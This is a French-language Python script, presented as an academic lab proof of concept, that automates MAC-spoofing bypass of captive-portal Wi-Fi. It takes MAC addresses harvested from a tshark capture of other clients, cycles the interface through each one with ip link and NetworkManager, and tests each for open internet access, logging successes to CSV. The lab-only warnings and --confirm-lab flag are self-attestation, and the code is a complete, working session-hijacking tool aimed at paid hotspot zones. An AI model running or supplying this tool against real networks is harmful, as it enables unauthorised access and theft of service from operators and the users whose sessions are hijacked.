#!/usr/bin/env python3
"""
WiFi Zone MAC Tester v2 — PoC académique LABO UNIQUEMENT.

Objectif pédagogique : démontrer en environnement contrôlé (votre propre AP
de labo, avec autorisation écrite) pourquoi l'authentification par MAC seule
est insuffisante, et comment un opérateur peut détecter / corriger cela.

INTERDIT sur tout réseau tiers sans autorisation explicite (intrusion / vol de service).
Le script exige une confirmation explicite et restaure toujours la MAC d'origine.

Usage labo :
  sudo python3 tester_mac.py --interface wlan0 --file macs.txt --lab-ap "MonLabo" --dry-run
  sudo python3 tester_mac.py --interface wlan0 --file macs.txt --lab-ap "MonLabo" --confirm-lab
"""

import argparse
import atexit
import csv
import os
import re
import shutil
import signal
import subprocess
import sys
import time
import urllib.parse
import urllib.request
from datetime import datetime
from pathlib import Path

MAC_RE = re.compile(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")
BROADCAST = "ff:ff:ff:ff:ff:ff"

ORIGINAL_MAC: str | None = None
INTERFACE_GLOBAL: str | None = None
RESTORED = False

# Langue des messages RETOURNÉS (détails affichés par la GUI). "fr" par défaut
# (CLI) ; la GUI bascule à "en" si l'utilisateur choisit l'anglais.
# Les log() console restent en français (usage CLI historique).
LANG = "fr"


def _(fr: str, en: str) -> str:
    """Message bilingue selon LANG."""
    return en if LANG == "en" else fr


def log(msg: str) -> None:
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)


# Hook optionnel : appelé avec la liste d'args à chaque commande exécutée.
# La GUI s'en sert comme journal des commandes ($ ...). None = silencieux (CLI).
COMMAND_LOGGER = None


def run(cmd: list[str], check: bool = True, capture: bool = False) -> subprocess.CompletedProcess:
    """Exécute sans shell=True (anti-injection)."""
    # cmd est une liste, jamais une string shell
    if COMMAND_LOGGER is not None:
        try:
            COMMAND_LOGGER(list(cmd))
        except Exception:
            pass
    return subprocess.run(cmd, check=check, capture_output=capture, text=True)


def is_multicast(mac: str) -> bool:
    # bit LSB du 1er octet = 1 -> multicast
    try:
        return (int(mac.split(":")[0], 16) & 1) == 1
    except ValueError:
        return True


def valid_mac(mac: str) -> tuple[bool, str]:
    mac = mac.strip().lower()
    if not MAC_RE.match(mac):
        return False, "format invalide"
    if mac == BROADCAST:
        return False, "broadcast"
    if is_multicast(mac):
        return False, "multicast"
    if mac.startswith("00:00:00"):
        return False, "OUI nulle"
    return True, ""


def get_current_mac(iface: str) -> str | None:
    path = Path(f"/sys/class/net/{iface}/address")
    try:
        return path.read_text().strip().lower()
    except OSError:
        return None


def interface_exists(iface: str) -> bool:
    return Path(f"/sys/class/net/{iface}").exists()


def has_tool(name: str) -> bool:
    return shutil.which(name) is not None


def save_original_mac(iface: str) -> None:
    global ORIGINAL_MAC, INTERFACE_GLOBAL, RESTORED
    INTERFACE_GLOBAL = iface
    RESTORED = False  # toute nouvelle session d'application réarme la restauration
    if ORIGINAL_MAC is not None:
        return  # on garde la toute première (la vraie d'origine, pas une usurpée)
    ORIGINAL_MAC = get_current_mac(iface)
    if ORIGINAL_MAC:
        log(f"MAC d'origine sauvegardée : {ORIGINAL_MAC}")


def get_permanent_mac(iface: str) -> str | None:
    """Adresse hardware PERMANENTE (insensible au spoofing), ou None.
    Lecture seule : ne modifie rien.
    Ordre important : ethtool -P d'abord (vrai hardware côté driver),
    nmcli GENERAL.HWADDR ensuite (lui suit parfois la MAC usurpée)."""
    try:
        if has_tool("ethtool"):
            r = run(["ethtool", "-P", iface], check=False, capture=True)
            m = re.search(r"([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})", r.stdout or "")
            if m:
                return m.group(1).lower()
    except Exception:
        pass
    try:
        r = run(["nmcli", "-t", "-f", "GENERAL.HWADDR", "device", "show", iface],
                check=False, capture=True)
        if r.returncode == 0:
            for line in (r.stdout or "").splitlines():
                if "HWADDR" in line and ":" in line:
                    cand = line.split(":", 1)[1].strip().lower()
                    ok, _ = valid_mac(cand)
                    if ok:
                        return cand
    except Exception:
        pass
    return None


def get_ipv4(iface: str) -> str | None:
    """Première IPv4 de l'interface, ou None (lecture seule, sans rien modifier)."""
    try:
        r = run(["ip", "-4", "-o", "addr", "show", "dev", iface], check=False, capture=True)
        if r.returncode == 0:
            m = re.search(r"\binet (\d+\.\d+\.\d+\.\d+)", r.stdout or "")
            if m:
                return m.group(1)
    except Exception:
        pass
    return None


def wait_for_ipv4(iface: str, max_wait: float) -> bool:
    """Attend qu'une IPv4 soit assignée (DHCP), par polling 0.5s.
    Sortie précoce dès que l'IP est là : bien plus rapide qu'un sleep fixe."""
    deadline = time.time() + max(1.0, max_wait)
    while time.time() < deadline:
        if get_ipv4(iface) is not None:
            return True
        time.sleep(0.5)
    return False


def ensure_link_up(iface: str) -> None:
    """Remonte l'interface et reconnecte via NetworkManager. Best-effort, ne lève jamais."""
    try:
        run(["ip", "link", "set", "dev", iface, "up"], check=False)
    except Exception:
        pass
    try:
        if has_tool("nmcli"):
            run(["nmcli", "device", "connect", iface], check=False)
    except Exception:
        pass


def active_connection(iface: str) -> str | None:
    """Nom du profil NetworkManager actif sur l'interface, ou None."""
    if not has_tool("nmcli"):
        return None
    try:
        r = run(["nmcli", "-t", "-f", "NAME,DEVICE", "connection", "show", "--active"],
                check=False, capture=True)
        for line in (r.stdout or "").splitlines():
            if ":" not in line:
                continue
            name, dev = line.rsplit(":", 1)
            if dev.strip() == iface:
                return name.strip() or None
    except Exception:
        pass
    return None


def clear_cloned_mac(iface: str) -> None:
    """Efface le cloned-mac-address du profil actif (best-effort)."""
    con = active_connection(iface)
    if con is None:
        return
    for prop in ("802-11-wireless.cloned-mac-address", "ethernet.cloned-mac-address"):
        try:
            run(["nmcli", "connection", "modify", con, prop, ""], check=False)
        except Exception:
            pass


def apply_mac_persistent(iface: str, mac: str, delay: float = 6.0) -> tuple[bool, str]:
    """Applique une MAC en résistant à NetworkManager (qui sinon restaure la
    MAC d'usine à chaque reconnect quand le profil n'a pas de cloned-mac).

    Séquence (celle qui marche à la main) : modify + up direct, sans down
    préalable — `connection up` réactive déjà le profil tout seul.
    1) profil NM actif -> cloned-mac-address + up + vérification lue ;
    2) sinon repli ip link classique + vérification lue.
    Retourne (ok, détail avec MAC réellement lue)."""
    mac = mac.strip().lower()
    con = active_connection(iface)
    if con is not None:
        picked = None
        for prop in ("802-11-wireless.cloned-mac-address", "ethernet.cloned-mac-address"):
            r = run(["nmcli", "connection", "modify", con, prop, mac], check=False)
            if r.returncode == 0:
                picked = prop
                break
        if picked is None:
            return False, _(f"profil « {con} » : propriété cloned-mac-address refusée",
                            f"profile \"{con}\": cloned-mac-address property refused")
        r = run(["nmcli", "connection", "up", con], check=False, capture=True)
        # Preuve n°1 : la carte a redémarré ET obtenu une IP (DHCP).
        # Sans IP, le curl est inutile : on échoue vite et on passe à la suivante.
        got_ip = wait_for_ipv4(iface, delay)
        actual = (get_current_mac(iface) or "?").lower()
        ip = get_ipv4(iface)
        if actual != mac:
            return False, (_(f"profil « {con} » appliqué mais MAC lue = {actual} "
                              f"(demandée {mac}). Sortie : {((r.stdout or '') + (r.stderr or ''))[-200:]}",
                              f"profile \"{con}\" applied but read MAC = {actual} "
                              f"(requested {mac}). Output: {((r.stdout or '') + (r.stderr or ''))[-200:]}"))
        if not got_ip or not ip:
            return False, (_(f"MAC {actual} appliquée mais pas d'IP "
                              f"(DHCP échoué : carte redémarrée sans adresse, curl inutile)",
                              f"MAC {actual} applied but no IP "
                              f"(DHCP failed: interface restarted with no address, curl useless)"))
        return True, _(f"profil « {con} » ({picked}) + reconnecté, MAC vérifiée : {actual}, IP : {ip}",
                       f"profile \"{con}\" ({picked}) + reconnected, verified MAC: {actual}, IP: {ip}")
    ok = set_mac(iface, mac, reconnect=True, delay=delay)
    actual = (get_current_mac(iface) or "?").lower()
    ip = get_ipv4(iface)
    if ok and actual == mac and ip:
        return True, _(f"ip link appliqué, MAC vérifiée : {actual}, IP : {ip}",
                       f"ip link applied, verified MAC: {actual}, IP: {ip}")
    if actual != mac:
        return False, _(f"ip link : MAC lue = {actual} (demandée {mac})",
                        f"ip link: read MAC = {actual} (requested {mac})")
    return False, _(f"ip link : MAC {actual} OK mais pas d'IP (DHCP échoué, curl inutile)",
                    f"ip link: MAC {actual} OK but no IP (DHCP failed, curl useless)")


def restore_mac(iface: str | None = None) -> tuple[bool, str]:
    """Restaure la MAC d'origine (celle de début de session, sinon la hardware
    permanente insensible au spoof) + reconnecte. Retourne (ok, message).
    Ne lève jamais ; ne prétend jamais un succès non vérifié."""
    global RESTORED
    target_iface = iface or INTERFACE_GLOBAL
    if target_iface is None:
        return False, _("interface inconnue (aucune session)", "unknown interface (no session)")
    target = ORIGINAL_MAC or get_permanent_mac(target_iface)
    if not target:
        msg = _(f"MAC d'origine introuvable pour {target_iface}",
                f"original MAC not found for {target_iface}")
        log(f"ATTENTION {msg}")
        return False, msg
    try:
        log(f"Restauration MAC d'origine {target} sur {target_iface}...")
        # D'abord effacer le cloned-mac du profil actif, sinon NM réapplique
        # la MAC usurpée au reconnect et la restauration semble ne rien faire.
        clear_cloned_mac(target_iface)
        set_mac(target_iface, target, reconnect=False)
        ensure_link_up(target_iface)
        actual = (get_current_mac(target_iface) or "?").lower()
        if actual == target.lower():
            RESTORED = True
            msg = _(f"MAC restaurée et vérifiée : {actual}",
                    f"MAC restored and verified: {actual}")
            log(msg + ".")
            return True, msg
        msg = _(f"restauration demandée {target}, MAC lue = {actual}",
                f"restore requested {target}, read MAC = {actual}")
        log(f"ATTENTION {msg}")
        return False, msg
    except Exception as e:  # noqa: BLE001 — best effort en sortie
        msg = _(f"restauration échouée : {e}", f"restore failed: {e}")
        log(f"ATTENTION {msg} — manuel : ip link set dev {target_iface} address {target}")
        try:
            ensure_link_up(target_iface)
        except Exception:
            pass
        return False, msg


def set_mac(iface: str, mac: str, reconnect: bool = True, delay: float = 4.0) -> bool:
    """Applique une MAC. Retourne True si OK. Gère NetworkManager si présent.
    L'interface est TOUJOURS remontée, même en cas d'échec (finally)."""
    try:
        use_nm = has_tool("nmcli")
        if use_nm:
            # NetworkManager écrase 'ip link' seul -> disconnect d'abord
            run(["nmcli", "device", "disconnect", iface], check=False)
            time.sleep(1)

        try:
            run(["ip", "link", "set", "dev", iface, "down"])
            run(["ip", "link", "set", "dev", iface, "address", mac])
        finally:
            # Ne JAMAIS laisser l'interface down (ex: MAC rejetée par le kernel)
            run(["ip", "link", "set", "dev", iface, "up"], check=False)

        if reconnect:
            if use_nm:
                run(["nmcli", "device", "connect", iface], check=False)
            # Attente DHCP intelligente : sort dès que l'IPv4 est là (max = delay)
            wait_for_ipv4(iface, delay)
        return True
    except subprocess.CalledProcessError as e:
        log(f"Échec changement MAC vers {mac} : {e}")
        ensure_link_up(iface)
        return False


def fetch_http(url: str, timeout: int) -> tuple[str, str, str]:
    """GET HTTP sans suivre aveuglément : retourne (code, url_finale, body_début)."""
    import urllib.request
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Labo-TP)"}, method="GET")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            code = str(resp.status)
            final = resp.geturl()
            body = resp.read(8000).decode("utf-8", errors="ignore").lower()
            return code, final, body
    except Exception as e:
        return "", "", f"erreur: {e}".lower()


PORTAL_KEYWORDS = ("captive", "portal", "portail", "login", "log in", "authentif", "wifizone", "ticket", "forfait", "recharge")

GOOGLE_HOST_RE = re.compile(r"(^|\.)google\.[a-z.]+$")


def test_connectivity(http_url: str, timeout: int) -> dict:
    """Équivalent curl sur google.com : succès = vraie page Google atteignable,
    pas un portail captif. Rapide : une URL, timeout court. Pas de ping —
    la passerelle répond même sans authentification, donc le ping ne prouve rien.
    """
    # ping_ok conservé vide : compatibilité du CSV historique (results.csv).
    result = {"ping_ok": "", "http_ok": False, "http_code": "", "portal": False, "detail": ""}
    urls = [u.strip() for u in http_url.split(",") if u.strip()] or ["http://www.google.com"]
    for url in urls:
        code, final, body = fetch_http(url, timeout)
        if not code:
            result["detail"] = _(f"{url} injoignable ({body[:80]})",
                                 f"{url} unreachable ({body[:80]})")
            continue
        result["http_code"] = code
        host = (urllib.parse.urlparse(final).hostname or "").lower()
        if code == "204":
            result.update(http_ok=True, portal=False,
                          detail=_(f"{url} -> 204 internet ouvert",
                                   f"{url} -> 204 internet open"))
            break
        if code.startswith("2") and GOOGLE_HOST_RE.search(host):
            result.update(http_ok=True, portal=False,
                          detail=_(f"{url} -> {code} Google OK ({host})",
                                   f"{url} -> {code} Google OK ({host})"))
            break
        if code.startswith("2") and not any(k in body for k in PORTAL_KEYWORDS):
            # URL personnalisée (--http-url) : 200 propre, pas de portail
            result.update(http_ok=True, portal=False,
                          detail=_(f"{url} -> {code} internet ouvert",
                                   f"{url} -> {code} internet open"))
            break
        result.update(http_ok=False, portal=True,
                      detail=_(f"{url} -> {code} portail captif (final: {final[:80]})",
                               f"{url} -> {code} captive portal (final: {final[:80]})"))
    if not result["detail"]:
        result["detail"] = _("aucune URL testée", "no URL tested")
    return result


def load_macs(path: Path, skip_own: str | None) -> tuple[list[str], list[str]]:
    raw = path.read_text(errors="ignore").splitlines()
    seen: set[str] = set()
    kept: list[str] = []
    rejected: list[str] = []
    for line in raw:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        # tshark peut sortir "a \t b" -> on a déjà split, mais gère le cas tabulé
        for token in re.split(r"[\s\t,;]+", line):
            token = token.strip().lower()
            if not token:
                continue
            ok, reason = valid_mac(token)
            if not ok:
                rejected.append(f"{token} ({reason})")
                continue
            if skip_own and token == skip_own:
                rejected.append(f"{token} (votre propre MAC, ignorée)")
                continue
            if token not in seen:
                seen.add(token)
                kept.append(token)
    return kept, rejected


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Testeur MAC académique — LABO AUTORISÉ UNIQUEMENT. Restaure la MAC d'origine."
    )
    p.add_argument("--interface", "-i", default="wlan0", help="Interface (défaut: wlan0)")
    p.add_argument("--file", "-f", default="mac_output.txt", help="Fichier MACs (1/ligne)")
    p.add_argument("--out", "-o", default="results.csv", help="CSV de résultats")
    p.add_argument("--http-url", default="http://www.google.com",
                   help="URL(s) test façon curl, séparées par virgule (défaut: google)")
    p.add_argument("--timeout", type=int, default=4, help="Timeout HTTP par MAC (s, défaut: 4)")
    p.add_argument("--delay", type=float, default=8.0, help="Attente MAX DHCP/reconnexion par MAC (s, sortie précoce dès l'IP, défaut: 8)")
    p.add_argument("--limit", type=int, default=0, help="Limiter à N MACs (0 = toutes, utile en démo)")
    p.add_argument("--dry-run", action="store_true", help="Valide + simule sans toucher l'interface")
    p.add_argument("--manual", action="store_true",
                   help="Mode manuel historique (pause Entrée au lieu du test auto)")
    p.add_argument("--confirm-lab", action="store_true",
                   help="Obligatoire hors --dry-run : confirme un labo vous appartenant / autorisé.")
    p.add_argument("--lab-ap", default="", help="Nom/SSID du labo (traçabilité pédagogique, ex: MonLabo-Test)")
    return p.parse_args()


def main() -> int:
    args = parse_args()

    if os.geteuid() != 0 and not args.dry_run:
        print("Erreur : lancez avec sudo (ou --dry-run pour simuler sans root).", file=sys.stderr)
        return 1

    if not interface_exists(args.interface) and not args.dry_run:
        print(f"Erreur : interface '{args.interface}' introuvable. Vérifiez avec 'ip a'.", file=sys.stderr)
        return 1

    mac_file = Path(args.file)
    if not mac_file.exists():
        print(f"Erreur : fichier '{mac_file}' introuvable.", file=sys.stderr)
        print("Générez-le depuis VOTRE capture labo, ex. :")
        print("  tshark -r labo.pcapng -T fields -e wlan.sa -e wlan.addr | tr '\\t' '\\n' | sort -u > mac_output.txt")
        return 1

    own = get_current_mac(args.interface)
    macs, rejected = load_macs(mac_file, skip_own=own)
    if args.limit and args.limit > 0:
        macs = macs[: args.limit]

    if not macs:
        print("Aucune MAC valide après filtrage.")
        if rejected[:10]:
            print("Exemples rejetés :", ", ".join(rejected[:10]))
        return 1

    log(f"{len(macs)} MAC(s) valide(s), {len(rejected)} rejetée(s).")
    if rejected[:5]:
        log(f"Rejetées (extrait) : {', '.join(rejected[:5])}")

    if args.dry_run:
        log("DRY-RUN : aucune modification réseau.")
        for i, m in enumerate(macs, 1):
            print(f"  [{i}/{len(macs)}] {m} -> simulé OK")
        log(f"Sortie CSV non écrite en dry-run (cible : {args.out}).")
        return 0

    # --- Garde-fou éthique : hors dry-run, confirmation obligatoire ---
    if not args.confirm_lab:
        print("\n⛔ GARDE-FOU ÉTHIQUE", file=sys.stderr)
        print("Ce script modifie votre MAC et teste une authentification.", file=sys.stderr)
        print("Utilisez-le UNIQUEMENT sur votre propre labo / réseau avec autorisation écrite.", file=sys.stderr)
        print("Relancez avec --confirm-lab --lab-ap \"NomDeVotreLabo\" pour attester.", file=sys.stderr)
        print("Ex : sudo python3 tester_mac.py -i wlan0 -f mac_output.txt --lab-ap MonLabo --confirm-lab\n", file=sys.stderr)
        return 2
    if not args.lab_ap:
        print("Précisez --lab-ap \"NomDuLabo\" pour traçabilité (ex: TP-Reseau-SalleB).", file=sys.stderr)
        return 2

    log(f"Labo déclaré : {args.lab_ap} — traçabilité pédagogique, usage autorisé uniquement.")

    save_original_mac(args.interface)
    atexit.register(restore_mac)
    signal.signal(signal.SIGTERM, lambda *_: (restore_mac(), sys.exit(130)))

    out_path = Path(args.out)
    is_new = not out_path.exists()
    fcsv = out_path.open("a", newline="")
    writer = csv.DictWriter(fcsv, fieldnames=["timestamp", "lab", "interface", "mac", "applied", "ping_ok", "http_ok", "http_code", "portal", "detail", "mode"])
    if is_new:
        writer.writeheader()

    log(f"--- Début ({len(macs)} adresses) — Ctrl+C restaure automatiquement ---")
    try:
        for i, mac in enumerate(macs, 1):
            log(f"[{i}/{len(macs)}] Essai {mac}")
            # Voie persistante vérifiée : sinon NM restaure la MAC d'usine au
            # reconnect et le test se fait avec la mauvaise MAC (faux résultat).
            applied, apply_detail = apply_mac_persistent(args.interface, mac, delay=args.delay)
            log(f"Application : {apply_detail}")
            if not applied:
                writer.writerow({"timestamp": datetime.now().isoformat(timespec="seconds"), "lab": args.lab_ap,
                                 "interface": args.interface, "mac": mac, "applied": False,
                                 "ping_ok": False, "http_ok": False, "http_code": "", "portal": "", "detail": apply_detail, "mode": "auto"})
                fcsv.flush()
                continue
            if args.manual:
                print("✅ APPLIQUÉE. Testez dans le navigateur (http://www.google.com).")
                try:
                    input("--> Entrée = MAC suivante, Ctrl+C = arrêter + restaurer : ")
                except KeyboardInterrupt:
                    raise
                conn = {"ping_ok": "", "http_ok": "manuel", "http_code": "", "portal": "", "detail": "manuel navigateur"}
                mode = "manuel"
            else:
                # Cycle : carte up (garanti par apply) + MAC vérifiée lue + curl google -> résultat -> suivante
                conn = test_connectivity(args.http_url, args.timeout)
                mode = "auto"
                status = "✅ INTERNET OK" if conn["http_ok"] else ("⚠️ PORTAIL CAPTIF" if conn.get("portal") else "❌ pas d'internet")
                log(f"{status} ({conn['http_code']}) {conn.get('detail','')}")
            writer.writerow({"timestamp": datetime.now().isoformat(timespec="seconds"), "lab": args.lab_ap,
                             "interface": args.interface, "mac": mac, "applied": True,
                             "ping_ok": conn["ping_ok"], "http_ok": conn["http_ok"],
                             "http_code": conn["http_code"], "portal": conn.get("portal", ""), "detail": f"[{apply_detail}] {conn.get('detail', '')}", "mode": mode})
            fcsv.flush()
    except KeyboardInterrupt:
        log("Interrompu — restauration...")
        return 130
    finally:
        fcsv.close()
        restore_mac()

    log(f"Terminé. Résultats : {out_path.resolve()}")
    log("Contre-mesures à documenter dans votre rapport : portail captif + sessions, 802.1X/RADIUS, détection doublons MAC.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
